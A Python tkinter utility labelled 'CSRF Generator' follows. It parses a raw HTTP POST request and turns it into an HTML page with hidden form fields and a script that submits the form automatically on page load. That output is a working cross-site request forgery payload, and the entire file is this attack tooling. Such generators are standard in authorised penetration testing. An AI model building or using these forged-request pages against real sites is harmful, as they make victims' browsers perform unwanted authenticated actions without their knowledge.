import tkinter as tk
from tkinter import scrolledtext, messagebox

def parse_post_request(raw_request):
    try:
        # Separate headers and body
        parts = raw_request.split("\n\n", 1)
        headers_raw = parts[0]
        body = parts[1] if len(parts) > 1 else ""

        # Extract the POST URL from the first line, e.g. POST /sendFeedback HTTP/1.1
        first_line = headers_raw.splitlines()[0]
        method, path, _ = first_line.split()
        host = None
        for line in headers_raw.splitlines():
            if line.lower().startswith("host:"):
                host = line.split(":", 1)[1].strip()
                break

        if not host:
            raise ValueError("Host header not found")

        url = f"https://{host}{path}"

        # Parse body key=value pairs
        params = {}
        for pair in body.strip().split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                params[k] = v

        return url, params
    except Exception as e:
        raise ValueError(f"Failed to parse request: {e}")

def generate_csrf_form(url, params):
    form_fields = ""
    for k, v in params.items():
        # HTML escape minimal chars
        v_escaped = v.replace("&", "&amp;").replace("\"", "&quot;").replace("<", "&lt;").replace(">", "&gt;")
        form_fields += f'  <input type="hidden" name="{k}" value="{v_escaped}">\n'

    html = f"""<html>
  <body>
    <form action="{url}" method="POST">
{form_fields}      <input type="submit" value="Send CSRF">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>"""
    return html

def on_generate():
    raw_req = text_input.get("1.0", tk.END)
    try:
        url, params = parse_post_request(raw_req)
        result = generate_csrf_form(url, params)
        text_output.delete("1.0", tk.END)
        text_output.insert(tk.END, result)
    except Exception as e:
        messagebox.showerror("Error", str(e))

app = tk.Tk()
app.title("CSRF Generator")

tk.Label(app, text="Paste Raw POST Request Here:").pack(anchor="w")
text_input = scrolledtext.ScrolledText(app, height=15, width=80)
text_input.pack()

btn_generate = tk.Button(app, text="Generate CSRF", command=on_generate)
btn_generate.pack(pady=5)

tk.Label(app, text="Generated CSRF HTML:").pack(anchor="w")
text_output = scrolledtext.ScrolledText(app, height=15, width=80)
text_output.pack()

app.mainloop()
